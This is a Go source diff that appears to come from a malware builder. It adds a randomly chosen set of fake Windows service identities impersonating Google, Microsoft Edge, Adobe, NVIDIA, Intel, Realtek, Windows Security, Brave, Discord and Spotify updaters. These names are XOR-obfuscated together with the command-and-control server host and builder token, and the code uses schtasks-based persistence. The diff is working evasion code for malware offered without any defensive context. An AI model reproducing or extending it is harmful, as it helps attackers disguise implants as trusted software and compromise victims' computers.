@@ -174,6 +174,27 @@ var disguiseDirs = []string{
 	"DeviceMetadataStore",
 }
 
+type svcIdentity struct {
+	SvcName     string
+	DisplayName string
+	SvcExe      string
+	WorkerExe   string
+	MutexPrefix string
+}
+
+var svcIdentities = []svcIdentity{
+	{"GoogleUpdateAgent", "Google Update Agent", "GoogleUpdate.exe", "ChromeHelper.exe", "NvDisplayMutex"},
+	{"MicrosoftEdgeUpdate", "Microsoft Edge Update Service", "MicrosoftEdgeUpdate.exe", "msedge_proxy.exe", "EdgeGPUMutex"},
+	{"AdobeGCInvoker", "Adobe Genuine Service", "AdobeGCClient.exe", "AdobeARM.exe", "AdobeGCMutex"},
+	{"NvDisplayContainer", "NVIDIA Display Container", "NvContainerSvc.exe", "NvTelemetry.exe", "NvContainerMutex"},
+	{"IntelAudioService", "Intel Audio Service", "IntelAudioSvc.exe", "IntelAudioHelper.exe", "IntelSvcMutex"},
+	{"RealTimeSync", "Realtek Audio Service", "RtAudioSvc.exe", "RAVBg64.exe", "RtSyncMutex"},
+	{"WindowsSecurityHealth", "Windows Security Health Service", "SecurityHealth.exe", "SecurityHealthHost.exe", "WinSecMutex"},
+	{"BraveSoftwareUpdate", "Brave Update Service", "BraveUpdate.exe", "BraveHelper.exe", "BraveGCMutex"},
+	{"DiscordUpdate", "Discord Update Service", "DiscordUpdater.exe", "DiscordHelper.exe", "DiscordSvcMutex"},
+	{"SpotifyMigrator", "Spotify Update Service", "SpotifyMigrator.exe", "SpotifyHelper.exe", "SpotifySvcMutex"},
+}
+
 func pickDisguiseName() string {
 	r := rand.New(rand.NewSource(time.Now().UnixNano()))
 	return disguiseNames[r.Intn(len(disguiseNames))]
@@ -184,16 +205,18 @@ func pickDisguiseDir() string {
 	return disguiseDirs[r.Intn(len(disguiseDirs))]
 }
 
+func pickSvcIdentity() svcIdentity {
+	r := rand.New(rand.NewSource(time.Now().UnixNano()))
+	return svcIdentities[r.Intn(len(svcIdentities))]
+}
+
 func buildGlobals(cfg Config) (globalValues, error) {
 	safeBuildID := strings.TrimSpace(cfg.BuildID)
 	safeBuildID = sanitizeBuildID(safeBuildID)
 	key := generateXorKey()
 
-	svcName := "GoogleUpdateAgent"
-	displayName := "Google Update Agent"
-	svcExeName := "GoogleUpdate.exe"
-	workerExeName := "Google Chrome.exe"
-	mutexName := fmt.Sprintf("Global\\NvDisplayMutex_%s", safeBuildID)
+	ident := pickSvcIdentity()
+	mutexName := fmt.Sprintf("Global\\%s_%s", ident.MutexPrefix, safeBuildID)
 
 	encServerHost := xorWithKey(cfg.ServerHost, key)
 	encBuilderToken := xorWithKey(cfg.BuilderToken, key)
@@ -207,10 +230,10 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		EncServerHost:     encServerHost,
 		EncBuilderToken:   encBuilderToken,
 		EncMutexName:      xorWithKey(mutexName, key),
-		EncServiceName:    xorWithKey(svcName, key),
-		EncDisplayName:    xorWithKey(displayName, key),
-		EncServiceExeName: xorWithKey(svcExeName, key),
-		EncWorkerExeName:  xorWithKey(workerExeName, key),
+		EncServiceName:    xorWithKey(ident.SvcName, key),
+		EncDisplayName:    xorWithKey(ident.DisplayName, key),
+		EncServiceExeName: xorWithKey(ident.SvcExe, key),
+		EncWorkerExeName:  xorWithKey(ident.WorkerExe, key),
 		EncSchtasksExe:    xorWithKey("schtasks", key),
 		EncProgramDataEnv: xorWithKey("ProgramData", key),
 		EncWindowsUpdateDir: xorWithKey("GoogleUpdate", key),
